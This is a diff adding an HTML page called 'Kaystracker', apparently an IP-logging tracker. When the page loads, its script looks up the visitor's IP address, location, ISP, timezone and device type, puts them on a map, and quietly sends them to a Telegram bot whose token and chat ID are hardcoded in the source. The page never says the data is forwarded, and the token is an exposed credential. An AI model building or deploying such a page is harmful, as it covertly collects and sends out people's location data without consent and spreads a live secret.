@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kaystracker</title>
+  <style>
+    body {
+      font-family: "Courier New", monospace;
+      text-align: center;
+      background: #0d1117;
+      color: #e6edf3;
+      margin: 0;
+    }
+    #banner {
+      width: 100%;
+      background: #161b22;
+      color: #58a6ff;
+      padding: 20px 0;
+      font-size: 28px;
+      font-weight: bold;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.6);
+      position: fixed;
+      top: 0;
+      left: 0;
+      letter-spacing: 2px;
+    }
+    #content { margin-top: 120px; }
+    #info {
+      margin-top: 30px;
+      font-size: 18px;
+      width: 85%;
+      max-width: 650px;
+      margin: auto;
+      background: #161b22;
+      padding: 20px;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      text-align: left;
+      line-height: 1.6em;
+    }
+    #map {
+      margin-top: 20px;
+      width: 90%;
+      height: 400px;
+      margin: auto;
+      border: 2px solid #30363d;
+      border-radius: 8px;
+    }
+  </style>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+</head>
+<body>
+  <div id="banner">KAYSTRACKER</div>
+  <div id="content">
+    <h2>Visitor Information</h2>
+    <div id="info"><i>Loading...</i></div>
+    <div id="map"></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8419738033:AAFl2f0oF0CFnTHU44W1FLZqpH1ClEwF5TU";
+    const CHAT_ID = "984385037";
+
+    async function logIP() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const ip = data.ip;
+        const city = data.city || "Unknown";
+        const region = data.region || "Unknown";
+        const country = data.country_name || "Unknown";
+        const timezone = data.timezone || "Unknown";
+        const org = data.org || "Unknown ISP";
+        const loc = `${data.latitude},${data.longitude}`;
+
+        // Device info
+        const ua = navigator.userAgent;
+        let deviceInfo = "Unknown Device";
+        if (/iphone/i.test(ua)) deviceInfo = "iPhone";
+        else if (/ipad/i.test(ua)) deviceInfo = "iPad";
+        else if (/android/i.test(ua)) deviceInfo = "Android";
+        else if (/windows/i.test(ua)) deviceInfo = "Windows PC";
+        else if (/mac/i.test(ua)) deviceInfo = "MacOS";
+
+        // Info text
+        const infoText =
+`🌐 IP: ${ip}
+🏙️ Location: ${city}, ${region}, ${country}
+🕒 Timezone: ${timezone}
+📶 ISP: ${org}
+📱 Device: ${deviceInfo}`;
+
+        // Show on page
+        document.getElementById("info").innerText = infoText;
+
+        // Map
+        const [lat, lng] = loc.split(",");
+        document.getElementById("map").innerHTML = "";
+        const map = L.map('map').setView([lat, lng], 10);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+        L.marker([lat, lng]).addTo(map).bindPopup(`IP: ${ip}`).openPopup();
+
+        // Send to Telegram
+        const msg = encodeURIComponent(infoText);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+
+      } catch (err) {
+        document.getElementById("info").innerText = "Error loading IP info.";
+      }
+    }
+
+    // Run automatically on page load
+    window.onload = logIP;
+  </script>
+</body>
+</html>
